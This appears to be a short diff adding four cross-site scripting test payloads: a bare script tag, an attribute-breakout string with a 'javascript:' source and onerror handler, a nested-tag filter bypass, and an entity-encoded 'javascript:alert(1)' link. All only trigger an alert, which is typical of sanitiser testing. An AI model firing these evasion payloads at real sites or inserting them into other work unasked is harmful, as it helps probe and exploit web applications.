@@ -1,0 +1,4 @@
+<script>alert</script>
+"type="image"SRC="javascr ipt:alert(1);"ONerror="alert(1)"width="expression('alert(1)')
+<scriscriptpt>alert(1)</scriscriptpt>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">sas</a>
